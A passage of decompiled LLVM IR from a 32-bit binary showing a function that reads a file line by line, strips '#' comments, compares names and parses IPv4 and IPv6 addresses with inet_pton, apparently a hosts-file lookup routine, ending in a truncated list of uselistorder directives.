  %v1_8057805.pre-phi = phi i32* [ %.pre, %dec_label_pc_80576b6.dec_label_pc_8057801_crit_edge ], [ %v1_80576d2, %dec_label_pc_8057733 ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_80576b6.dec_label_pc_8057801_crit_edge ], [ %v4_8057743, %dec_label_pc_8057733 ]
  %stack_var_-20.0.in = phi i32 [ %v1_80576bb, %dec_label_pc_80576b6.dec_label_pc_8057801_crit_edge ], [ %v0_805773f, %dec_label_pc_8057733 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_80576b6.dec_label_pc_8057801_crit_edge ], [ %v1_80576bb, %dec_label_pc_8057733 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_80576b6.dec_label_pc_8057801_crit_edge ], [ %v0_805773b, %dec_label_pc_8057733 ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_80576b6.dec_label_pc_8057801_crit_edge ], [ %v0_8057726, %dec_label_pc_8057733 ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_80576b6.dec_label_pc_8057801_crit_edge ], [ %v1_80576ff, %dec_label_pc_8057733 ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8057805.pre-phi, align 4
  %v12_805788f = icmp eq i32 %arg4, 2
  %v2_80578ba = inttoptr i32 %arg2 to i8*
  %v12_80578cd = icmp eq i32 %arg3, 2
  %v12_80578ef = icmp eq i32 %arg3, 10
  %v1_8057899 = icmp eq i1 %v12_805788f, false
  %v1_80578d2 = icmp eq i1 %v12_80578cd, false
  %v1_80578f4 = icmp eq i1 %v12_80578ef, false
  br label %dec_label_pc_8057917.outer

dec_label_pc_8057917.outer:                       ; preds = %dec_label_pc_80578ef, %dec_label_pc_80578f6, %dec_label_pc_80578d4, %dec_label_pc_8057801
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_8057801 ], [ 2, %dec_label_pc_80578d4 ], [ 2, %dec_label_pc_80578f6 ], [ 2, %dec_label_pc_80578ef ]
  br label %dec_label_pc_8057917

dec_label_pc_8057818:                             ; preds = %dec_label_pc_8057917
  %v3_8057820 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8057820, i32* @eax, align 4
  %v1_8057828 = icmp eq i32 %v3_8057820, 0
  br i1 %v1_8057828, label %dec_label_pc_805782f, label %dec_label_pc_805782c

dec_label_pc_805782c:                             ; preds = %dec_label_pc_8057818
  %v1_805782c = inttoptr i32 %v3_8057820 to i8*
  store i8 0, i8* %v1_805782c, align 1
  br label %dec_label_pc_805782f

dec_label_pc_805782f:                             ; preds = %dec_label_pc_8057818, %dec_label_pc_805782c
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805786f34 = load i8, i8* %stack_var_-20.0, align 1
  %v3_805786f35 = icmp eq i8 %v2_805786f34, 0
  %v1_805787241 = icmp eq i1 %v3_805786f35, false
  br i1 %v1_805787241, label %dec_label_pc_805783b.preheader.preheader, label %dec_label_pc_8057874

dec_label_pc_805783b.preheader.preheader:         ; preds = %dec_label_pc_805782f
  %v4_805783b98.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805783b.preheader

dec_label_pc_8057837:                             ; preds = %dec_label_pc_8057841
  store i8 0, i8* %v1_805783b104, align 1
  %v0_805783a = load i32, i32* @ecx, align 4
  %v1_805783a = add i32 %v0_805783a, 1
  store i32 %v1_805783a, i32* @ecx, align 4
  %v1_805783b = inttoptr i32 %v1_805783a to i8*
  %v2_805783b = load i8, i8* %v1_805783b, align 1
  %v3_805783b = zext i8 %v2_805783b to i32
  %v4_805783b = load i32, i32* %eax.global-to-local, align 4
  %v5_805783b = and i32 %v4_805783b, -256
  %v6_805783b = or i32 %v5_805783b, %v3_805783b
  store i32 %v6_805783b, i32* @eax, align 4
  %v4_805783d = icmp eq i8 %v2_805783b, 0
  br i1 %v4_805783d, label %dec_label_pc_805783b.dec_label_pc_8057874.loopexit_crit_edge, label %dec_label_pc_8057841

dec_label_pc_8057841:                             ; preds = %dec_label_pc_805783b.preheader, %dec_label_pc_8057837
  %v2_805783b105 = phi i8 [ %v2_805783b, %dec_label_pc_8057837 ], [ %v2_805783b96, %dec_label_pc_805783b.preheader ]
  %v1_805783b104 = phi i8* [ %v1_805783b, %dec_label_pc_8057837 ], [ %v1_805783b95, %dec_label_pc_805783b.preheader ]
  %v0_8057837103 = phi i32 [ %v1_805783a, %dec_label_pc_8057837 ], [ %v0_805783b49, %dec_label_pc_805783b.preheader ]
  %v2_8057841 = sext i8 %v2_805783b105 to i32
  store i32 %v2_8057841, i32* @edx, align 4
  %v0_8057844 = load i32, i32* @global_var_805b298, align 8
  store i32 %v0_8057844, i32* %eax.global-to-local, align 4
  %v2_8057849 = mul nsw i32 %v2_8057841, 2
  %v3_8057849 = add i32 %v0_8057844, %v2_8057849
  %v4_8057849 = inttoptr i32 %v3_8057849 to i8*
  %v5_8057849 = load i8, i8* %v4_8057849, align 1
  %v6_8057849 = and i8 %v5_8057849, 32
  %v7_8057849 = icmp eq i8 %v6_8057849, 0
  %v1_805784d = icmp eq i1 %v7_8057849, false
  br i1 %v1_805784d, label %dec_label_pc_8057837, label %dec_label_pc_805784f

dec_label_pc_805784f:                             ; preds = %dec_label_pc_8057841
  %v0_805784f = load i32, i32* @edi, align 4
  %v1_805784f = add i32 %v0_805784f, -6
  %v6_805784f = sub i32 5, %v0_805784f
  %v7_805784f = and i32 %v6_805784f, %v0_805784f
  %v8_805784f = icmp slt i32 %v7_805784f, 0
  %v9_805784f = icmp eq i32 %v1_805784f, 0
  %v10_805784f = icmp slt i32 %v1_805784f, 0
  %v3_8057852 = icmp eq i1 %v10_805784f, %v8_805784f
  %v4_8057852 = icmp eq i1 %v9_805784f, false
  %v5_8057852 = and i1 %v4_8057852, %v3_8057852
  br i1 %v5_8057852, label %dec_label_pc_805785b.preheader, label %dec_label_pc_8057854

dec_label_pc_8057854:                             ; preds = %dec_label_pc_805784f
  %v1_8057854 = load i32, i32* @ebx, align 4
  %v3_8057854 = mul i32 %v0_805784f, 4
  %v4_8057854 = add i32 %v1_8057854, %v3_8057854
  %v5_8057854 = inttoptr i32 %v4_8057854 to i32*
  store i32 %v0_8057837103, i32* %v5_8057854, align 4
  %v0_8057857 = load i32, i32* @edi, align 4
  %v1_8057857 = add i32 %v0_8057857, 1
  store i32 %v1_8057857, i32* @edi, align 4
  %v0_805785b.pre.pre = load i32, i32* @ecx, align 4
  %v4_805785b.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805785b.preheader

dec_label_pc_805785b.preheader:                   ; preds = %dec_label_pc_8057854, %dec_label_pc_805784f
  %v4_805785b.pre = phi i32 [ %v4_805785b.pre.pre, %dec_label_pc_8057854 ], [ %v0_8057844, %dec_label_pc_805784f ]
  %v0_805785b.pre = phi i32 [ %v0_805785b.pre.pre, %dec_label_pc_8057854 ], [ %v0_8057837103, %dec_label_pc_805784f ]
  %v0_805787454 = phi i32 [ %v1_8057857, %dec_label_pc_8057854 ], [ %v0_805784f, %dec_label_pc_805784f ]
  %v1_805785b106 = inttoptr i32 %v0_805785b.pre to i8*
  %v2_805785b107 = load i8, i8* %v1_805785b106, align 1
  %v3_805785b108 = zext i8 %v2_805785b107 to i32
  %v5_805785b109 = and i32 %v4_805785b.pre, -256
  %v6_805785b110 = or i32 %v3_805785b108, %v5_805785b109
  store i32 %v6_805785b110, i32* @eax, align 4
  %v4_805785d111 = icmp eq i8 %v2_805785b107, 0
  br i1 %v4_805785d111, label %dec_label_pc_805786f.loopexit, label %dec_label_pc_8057861.lr.ph

dec_label_pc_8057861.lr.ph:                       ; preds = %dec_label_pc_805785b.preheader
  %v0_8057864.pre = load i32, i32* @global_var_805b298, align 8
  br label %dec_label_pc_8057861

dec_label_pc_805785a:                             ; preds = %dec_label_pc_8057861
  %v1_805785a = add i32 %v0_805786f113, 1
  store i32 %v1_805785a, i32* @ecx, align 4
  %v1_805785b = inttoptr i32 %v1_805785a to i8*
  %v2_805785b = load i8, i8* %v1_805785b, align 1
  %v3_805785b = zext i8 %v2_805785b to i32
  %v5_805785b = and i32 %v0_8057864.pre, -256
  %v6_805785b = or i32 %v3_805785b, %v5_805785b
  store i32 %v6_805785b, i32* @eax, align 4
  %v4_805785d = icmp eq i8 %v2_805785b, 0
  br i1 %v4_805785d, label %dec_label_pc_805786f.loopexit, label %dec_label_pc_8057861

dec_label_pc_8057861:                             ; preds = %dec_label_pc_8057861.lr.ph, %dec_label_pc_805785a
  %v2_805785b115 = phi i8 [ %v2_805785b107, %dec_label_pc_8057861.lr.ph ], [ %v2_805785b, %dec_label_pc_805785a ]
  %v1_805785b114 = phi i8* [ %v1_805785b106, %dec_label_pc_8057861.lr.ph ], [ %v1_805785b, %dec_label_pc_805785a ]
  %v0_805786f113 = phi i32 [ %v0_805785b.pre, %dec_label_pc_8057861.lr.ph ], [ %v1_805785a, %dec_label_pc_805785a ]
  %v2_8057861 = sext i8 %v2_805785b115 to i32
  store i32 %v2_8057861, i32* @edx, align 4
  store i32 %v0_8057864.pre, i32* @eax, align 4
  %v2_8057869 = mul nsw i32 %v2_8057861, 2
  %v3_8057869 = add i32 %v0_8057864.pre, %v2_8057869
  %v4_8057869 = inttoptr i32 %v3_8057869 to i8*
  %v5_8057869 = load i8, i8* %v4_8057869, align 1
  %v6_8057869 = and i8 %v5_8057869, 32
  %v7_8057869 = icmp eq i8 %v6_8057869, 0
  br i1 %v7_8057869, label %dec_label_pc_805785a, label %dec_label_pc_805786f.loopexit

dec_label_pc_805786f.loopexit:                    ; preds = %dec_label_pc_8057861, %dec_label_pc_805785a, %dec_label_pc_805785b.preheader
  %v4_805783b98139 = phi i32 [ %v6_805785b110, %dec_label_pc_805785b.preheader ], [ %v6_805785b, %dec_label_pc_805785a ], [ %v0_8057864.pre, %dec_label_pc_8057861 ]
  %v0_805786f.lcssa = phi i32 [ %v0_805785b.pre, %dec_label_pc_805785b.preheader ], [ %v1_805785a, %dec_label_pc_805785a ], [ %v0_805786f113, %dec_label_pc_8057861 ]
  %v1_805785b.lcssa = phi i8* [ %v1_805785b106, %dec_label_pc_805785b.preheader ], [ %v1_805785b, %dec_label_pc_805785a ], [ %v1_805785b114, %dec_label_pc_8057861 ]
  %v2_805786f = load i8, i8* %v1_805785b.lcssa, align 1
  %v3_805786f = icmp eq i8 %v2_805786f, 0
  %v1_8057872 = icmp eq i1 %v3_805786f, false
  br i1 %v1_8057872, label %dec_label_pc_805783b.preheader, label %dec_label_pc_8057874

dec_label_pc_805783b.preheader:                   ; preds = %dec_label_pc_805783b.preheader.preheader, %dec_label_pc_805786f.loopexit
  %v0_8057874.pre142 = phi i32 [ %v0_805787454, %dec_label_pc_805786f.loopexit ], [ 0, %dec_label_pc_805783b.preheader.preheader ]
  %v4_805783b98 = phi i32 [ %v4_805783b98139, %dec_label_pc_805786f.loopexit ], [ %v4_805783b98.pre, %dec_label_pc_805783b.preheader.preheader ]
  %v0_805783b49 = phi i32 [ %v0_805786f.lcssa, %dec_label_pc_805786f.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_805783b.preheader.preheader ]
  %v1_805783b95 = inttoptr i32 %v0_805783b49 to i8*
  %v2_805783b96 = load i8, i8* %v1_805783b95, align 1
  %v3_805783b97 = zext i8 %v2_805783b96 to i32
  %v5_805783b99 = and i32 %v4_805783b98, -256
  %v6_805783b100 = or i32 %v5_805783b99, %v3_805783b97
  store i32 %v6_805783b100, i32* @eax, align 4
  %v4_805783d101 = icmp eq i8 %v2_805783b96, 0
  br i1 %v4_805783d101, label %dec_label_pc_8057874, label %dec_label_pc_8057841

dec_label_pc_805783b.dec_label_pc_8057874.loopexit_crit_edge: ; preds = %dec_label_pc_8057837
  %v0_8057874.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057874

dec_label_pc_8057874:                             ; preds = %dec_label_pc_805786f.loopexit, %dec_label_pc_805783b.dec_label_pc_8057874.loopexit_crit_edge, %dec_label_pc_805783b.preheader, %dec_label_pc_805782f
  %v1_8057877 = phi i32 [ 0, %dec_label_pc_805782f ], [ %v0_8057874.pre.pre, %dec_label_pc_805783b.dec_label_pc_8057874.loopexit_crit_edge ], [ %v0_8057874.pre142, %dec_label_pc_805783b.preheader ], [ %v0_805787454, %dec_label_pc_805786f.loopexit ]
  %v0_8057877 = load i32, i32* @ebx, align 4
  %v2_8057877 = mul i32 %v1_8057877, 4
  %v3_8057877 = add i32 %v0_8057877, %v2_8057877
  %v4_8057877 = inttoptr i32 %v3_8057877 to i32*
  store i32 0, i32* %v4_8057877, align 4
  %v7_805787e = icmp sgt i32 %v1_8057877, 1
  br i1 %v7_805787e, label %dec_label_pc_8057884, label %dec_label_pc_8057917

dec_label_pc_8057884:                             ; preds = %dec_label_pc_8057874
  br i1 %v12_80576b6, label %dec_label_pc_8057951, label %dec_label_pc_805788f

dec_label_pc_805788f:                             ; preds = %dec_label_pc_8057884
  store i32 1, i32* @esi, align 4
  br i1 %v1_8057899, label %dec_label_pc_80578c7.preheader, label %dec_label_pc_805789b

dec_label_pc_80578c7.preheader:                   ; preds = %dec_label_pc_805788f
  %v1_80578c7119 = load i32, i32* @edi, align 4
  %v5_80578c9128 = icmp sgt i32 %v1_80578c7119, 1
  br i1 %v5_80578c9128, label %dec_label_pc_80578b1.lr.ph, label %dec_label_pc_8057917

dec_label_pc_80578b1.lr.ph:                       ; preds = %dec_label_pc_80578c7.preheader
  br label %dec_label_pc_80578b1

dec_label_pc_805789b:                             ; preds = %dec_label_pc_805788f
  %v0_805789b = load i32, i32* @eax, align 4
  %v0_805789d = load i32, i32* @ebx, align 4
  %v1_805789d = inttoptr i32 %v0_805789d to i32*
  %v2_805789d = load i32, i32* %v1_805789d, align 4
  %v5_80578a3 = call i32 @__GI_strcoll(i8* %v2_80578ba, i32 %v2_805789d, i32 %v0_805789b, i32 %v0_805789b)
  store i32 %v5_80578a3, i32* %eax.global-to-local, align 4
  %v1_80578ab = icmp eq i32 %v5_80578a3, 0
  %v1_80578ad = icmp eq i1 %v1_80578ab, false
  br i1 %v1_80578ad, label %dec_label_pc_8057917, label %dec_label_pc_80578cd

dec_label_pc_80578b1:                             ; preds = %dec_label_pc_80578b1.lr.ph, %dec_label_pc_80578c6
  %v1_80578b3129 = phi i32 [ 1, %dec_label_pc_80578b1.lr.ph ], [ %v1_80578c6, %dec_label_pc_80578c6 ]
  %v0_80578b3 = load i32, i32* @ebx, align 4
  %v2_80578b3 = mul i32 %v1_80578b3129, 4
  %v3_80578b3 = add i32 %v0_80578b3, %v2_80578b3
  %v4_80578b3 = inttoptr i32 %v3_80578b3 to i32*
  %v5_80578b3 = load i32, i32* %v4_80578b3, align 4
  %v3_80578ba = call i32 @__GI_strcasecmp(i8* %v2_80578ba, i32 %v5_80578b3)
  store i32 %v3_80578ba, i32* %eax.global-to-local, align 4
  %v1_80578c2 = icmp eq i32 %v3_80578ba, 0
  br i1 %v1_80578c2, label %dec_label_pc_80578cd, label %dec_label_pc_80578c6

dec_label_pc_80578c6:                             ; preds = %dec_label_pc_80578b1
  %v0_80578c6 = load i32, i32* @esi, align 4
  %v1_80578c6 = add i32 %v0_80578c6, 1
  store i32 %v1_80578c6, i32* @esi, align 4
  %v1_80578c7 = load i32, i32* @edi, align 4
  %v5_80578c9 = icmp slt i32 %v1_80578c6, %v1_80578c7
  br i1 %v5_80578c9, label %dec_label_pc_80578b1, label %dec_label_pc_8057917

dec_label_pc_80578cd:                             ; preds = %dec_label_pc_805789b, %dec_label_pc_80578b1
  br i1 %v1_80578d2, label %dec_label_pc_80578ef, label %dec_label_pc_80578d4

dec_label_pc_80578d4:                             ; preds = %dec_label_pc_80578cd
  %v0_80578d4 = load i32, i32* @esi, align 4
  %v3_80578d5 = load i8*, i8** %stack_var_-44, align 4
  %v4_80578d5 = ptrtoint i8* %v3_80578d5 to i32
  %v0_80578d9 = load i32, i32* @ebx, align 4
  %v1_80578d9 = inttoptr i32 %v0_80578d9 to i32*
  %v2_80578d9 = load i32, i32* %v1_80578d9, align 4
  %v4_80578dd = inttoptr i32 %v2_80578d9 to i8*
  %v5_80578dd = call i32 @inet_pton(i32 2, i8* %v4_80578dd, i32 %v4_80578d5, i32 %v0_80578d4)
  store i32 %v5_80578dd, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_80578dd, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_805776d, label %dec_label_pc_8057917.outer

dec_label_pc_80578ef:                             ; preds = %dec_label_pc_80578cd
  br i1 %v1_80578f4, label %dec_label_pc_8057917.outer, label %dec_label_pc_80578f6

dec_label_pc_80578f6:                             ; preds = %dec_label_pc_80578ef
  %v0_80578f6 = load i32, i32* @ecx, align 4
  %v0_80578fb = load i32, i32* @ebx, align 4
  %v1_80578fb = inttoptr i32 %v0_80578fb to i32*
  %v2_80578fb = load i32, i32* %v1_80578fb, align 4
  %v4_80578ff = inttoptr i32 %v2_80578fb to i8*
  %v5_80578ff = call i32 @inet_pton(i32 10, i8* %v4_80578ff, i32 %stack_var_-36.0, i32 %v0_80578f6)
  store i32 %v5_80578ff, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_80578ff, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_805779a, label %dec_label_pc_8057917.outer

dec_label_pc_8057917:                             ; preds = %dec_label_pc_80578c7.preheader, %dec_label_pc_80578c6, %dec_label_pc_8057874, %dec_label_pc_805789b, %dec_label_pc_8057917.outer
  %v0_8057917 = load i32, i32* @edx, align 4
  %v3_8057921 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_8057917)
  store i32 %v3_8057921, i32* @eax, align 4
  %v1_8057929 = icmp eq i32 %v3_8057921, 0
  %v1_805792b = icmp eq i1 %v1_8057929, false
  br i1 %v1_805792b, label %dec_label_pc_8057818, label %dec_label_pc_8057931

dec_label_pc_8057931:                             ; preds = %dec_label_pc_8057917, %dec_label_pc_80577c6
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_80577c6 ], [ %stack_var_-28.0.ph, %dec_label_pc_8057917 ]
  br i1 %v12_80576b6, label %dec_label_pc_8057951, label %dec_label_pc_8057938

dec_label_pc_8057938:                             ; preds = %dec_label_pc_8057931
  %v1_805793f = inttoptr i32 %stack_var_4.0 to i16*
  %v2_805793f = call i32 @__GI_fclose(i16* %v1_805793f)
  store i32 %v2_805793f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057951

dec_label_pc_8057951:                             ; preds = %dec_label_pc_8057884, %dec_label_pc_80576a1, %dec_label_pc_80576ad, %dec_label_pc_80576cb, %dec_label_pc_80576de, %dec_label_pc_80576ea, %dec_label_pc_80576f3, %dec_label_pc_805771d, %dec_label_pc_8057931, %dec_label_pc_8057938, %dec_label_pc_8057753
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8057931 ], [ %stack_var_-28.1, %dec_label_pc_8057938 ], [ %v2_8057762, %dec_label_pc_8057753 ], [ 34, %dec_label_pc_805771d ], [ 34, %dec_label_pc_80576f3 ], [ 34, %dec_label_pc_80576ea ], [ 34, %dec_label_pc_80576de ], [ 34, %dec_label_pc_80576cb ], [ 34, %dec_label_pc_80576ad ], [ 34, %dec_label_pc_80576a1 ], [ %stack_var_-28.0.ph, %dec_label_pc_8057884 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_805768c, i32* @ebx, align 4
  store i32 %v0_805768b, i32* @esi, align 4
  store i32 %v0_805768a, i32* @edi, align 4
  store i32 %v0_8057689, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_80578c6, { 0, 2, 1 }
  uselistorder i32 %v1_8057877, { 1, 0 }
  uselistorder i8 %v2_805783b96, { 1, 2, 0 }
  uselistorder i8* %v1_805783b95, { 1, 0 }
  uselistorder i32 %v0_805783b49, { 1, 0 }
  uselistorder i32 %v2_8057861, { 1, 0 }
  uselistorder i32 %v1_805785a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8057864.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_805784f, { 1, 0 }
  uselistorder i32 %v0_805784f, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8057841, { 1, 0 }
  uselistorder i8* %v2_80578ba, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80576ff, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80576de, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80576bb, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_80576c2, { 1, 0 }
  uselistorder i32 %v1_805769c, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 11, 13, 12, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 15, 11, 1, 2, 17, 18, 16, 10, 0 }
  uselistorder i32 (i16*)* @__GI_fclose, { 3, 4, 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 1, 0 }
  uselistorder i32 5, { 15, 26, 27, 28, 0, 14, 8, 9, 19, 10, 29, 30, 2, 4, 23, 16, 24, 25, 7, 20, 11, 6, 21, 5, 22, 12, 13, 17, 18, 3, 1 }
  uselistorder i32 -6, { 2, 1, 3, 0 }
  uselistorder i8 32, { 20, 21, 22, 23, 24, 16, 0, 7, 17, 13, 14, 15, 8, 25, 18, 19, 26, 27, 2, 11, 3, 9, 1, 12, 4, 10, 5, 6 }
  uselistorder i32* @global_var_805b298, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 -256, { 1, 76, 0, 77, 12, 19, 78, 79, 3, 60, 59, 2, 80, 81, 6, 82, 4, 83, 5, 84, 96, 8, 62, 61, 7, 40, 41, 85, 42, 43, 44, 45, 46, 47, 13, 48, 91, 92, 98, 14, 25, 15, 99, 100, 89, 88, 9, 94, 95, 58, 86, 49, 50, 51, 52, 53, 54, 55, 10, 56, 57, 87, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 16, 17, 18, 11, 90, 93, 97 }
  uselistorder i32 35, { 1, 3, 2, 0 }
  uselistorder i32 10, { 20, 0, 29, 30, 31, 32, 33, 34, 1, 12, 21, 2, 8, 35, 9, 10, 11, 22, 3, 14, 27, 28, 13, 37, 23, 4, 24, 19, 18, 15, 16, 7, 36, 5, 25, 26, 17, 6 }
  uselistorder i32 12, { 77, 78, 79, 0, 80, 17, 41, 1, 81, 96, 24, 22, 7, 23, 8, 9, 10, 11, 12, 13, 14, 82, 56, 57, 58, 59, 60, 61, 62, 63, 2, 18, 19, 64, 65, 66, 130, 27, 42, 76, 95, 43, 44, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 45, 46, 47, 48, 49, 50, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 25, 129, 85, 86, 87, 88, 131, 67, 3, 4, 68, 69, 15, 16, 70, 5, 83, 84, 51, 52, 53, 54, 55, 26, 71, 20, 72, 73, 21, 74, 75, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 89, 90, 91, 92, 93, 94, 6 }
  uselistorder i32 80, { 0, 5, 6, 7, 8, 9, 10, 11, 2, 3, 4, 1 }
  uselistorder i32 56, { 7, 6, 12, 1, 13, 14, 15, 16, 3, 9, 4, 10, 5, 2, 17, 11, 8, 0 }
  uselistorder i32 44, { 10, 11, 12, 7, 1, 8, 9, 22, 14, 6, 19, 21, 20, 16, 17, 18, 15, 13, 2, 3, 4, 5, 0 }
  uselistorder i32 36, { 11, 12, 13, 15, 16, 17, 18, 19, 20, 2, 21, 3, 4, 22, 14, 6, 7, 8, 9, 10, 5, 1, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 15, 17, 18, 0, 8, 5, 1, 10, 6, 7, 11, 12, 13, 14, 4, 3, 16, 2, 9 }
  uselistorder i32 -48, { 2, 3, 4, 1, 0 }
  uselistorder i32 16, { 88, 87, 0, 89, 90, 14, 9, 91, 15, 92, 48, 49, 100, 101, 102, 103, 104, 105, 112, 106, 107, 108, 109, 110, 111, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 93, 94, 95, 96, 50, 51, 52, 53, 54, 55, 56, 57, 133, 16, 17, 29, 20, 43, 30, 38, 84, 39, 137, 1, 40, 41, 42, 3, 2, 131, 5, 4, 132, 7, 6, 123, 124, 18, 138, 97, 98, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 21, 73, 74, 75, 76, 134, 135, 136, 99, 13, 10, 28, 22, 44, 45, 46, 47, 77, 78, 79, 80, 81, 82, 19, 23, 83, 31, 32, 33, 34, 35, 36, 37, 85, 86, 12, 24, 125, 126, 127, 128, 129, 8, 25, 130, 11, 26, 27 }
  uselistorder i32 8, { 127, 126, 128, 0, 1, 129, 130, 131, 132, 133, 134, 8, 135, 2, 17, 136, 137, 138, 139, 33, 140, 88, 37, 19, 20, 21, 22, 38, 23, 24, 39, 40, 25, 41, 26, 42, 43, 142, 89, 90, 91, 92, 93, 94, 35, 34, 95, 96, 97, 98, 203, 204, 205, 30, 211, 31, 212, 32, 49, 27, 70, 125, 155, 71, 72, 157, 158, 159, 160, 161, 162, 163, 9, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 10, 73, 74, 75, 76, 77, 78, 79, 80, 174, 175, 176, 177, 178, 45, 11, 46, 12, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 44, 196, 197, 13, 198, 199, 200, 201, 14, 202, 149, 150, 3, 210, 99, 143, 144, 4, 5, 50, 100, 101, 102, 103, 105, 106, 107, 104, 108, 109, 110, 111, 28, 29, 112, 113, 114, 115, 116, 117, 206, 207, 208, 145, 146, 147, 148, 141, 209, 81, 82, 83, 6, 84, 85, 36, 86, 87, 47, 48, 118, 119, 120, 121, 122, 123, 124, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 18, 151, 152, 153, 154, 7, 156, 16, 15 }
  uselistorder i32 -32, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 32, { 72, 0, 73, 74, 29, 31, 79, 30, 80, 81, 82, 43, 44, 59, 86, 32, 52, 70, 71, 54, 55, 6, 5, 7, 8, 45, 9, 10, 53, 11, 12, 13, 14, 15, 1, 77, 75, 76, 60, 61, 2, 62, 63, 64, 65, 66, 67, 68, 16, 69, 46, 84, 85, 78, 83, 56, 57, 58, 34, 17, 47, 48, 18, 49, 3, 20, 19, 35, 36, 50, 4, 37, 21, 22, 24, 23, 38, 26, 25, 39, 41, 28, 27, 40, 42, 33, 51 }
  uselistorder i32 4, { 262, 263, 264, 258, 256, 257, 259, 260, 261, 0, 6, 265, 266, 267, 268, 269, 270, 271, 272, 273, 34, 55, 146, 147, 148, 35, 36, 37, 274, 50, 1, 227, 7, 8, 183, 184, 185, 186, 187, 188, 275, 276, 279, 280, 281, 282, 283, 284, 60, 285, 291, 292, 293, 69, 38, 294, 295, 296, 297, 39, 40, 41, 70, 42, 43, 71, 44, 298, 45, 299, 72, 46, 73, 74, 9, 286, 287, 75, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 56, 199, 370, 200, 371, 372, 378, 379, 384, 385, 386, 373, 51, 94, 222, 223, 374, 375, 376, 377, 10, 149, 150, 151, 152, 76, 243, 244, 245, 61, 310, 311, 312, 313, 153, 154, 155, 156, 157, 62, 11, 158, 159, 380, 382, 324, 325, 326, 327, 328, 329, 12, 330, 331, 332, 333, 334, 335, 336, 337, 322, 323, 161, 47, 162, 163, 164, 165, 166, 167, 168, 13, 170, 169, 338, 53, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 32, 359, 360, 54, 361, 14, 160, 381, 224, 225, 300, 301, 52, 302, 303, 304, 305, 2, 15, 3, 383, 16, 171, 201, 17, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 48, 49, 95, 77, 219, 220, 221, 288, 289, 57, 290, 277, 278, 172, 173, 174, 18, 175, 19, 33, 20, 21, 176, 177, 22, 178, 78, 179, 180, 79, 181, 80, 81, 182, 226, 228, 229, 230, 58, 231, 232, 233, 63, 64, 65, 234, 82, 83, 84, 85, 86, 66, 235, 87, 236, 67, 237, 238, 59, 239, 240, 241, 68, 242, 96, 97, 98, 99, 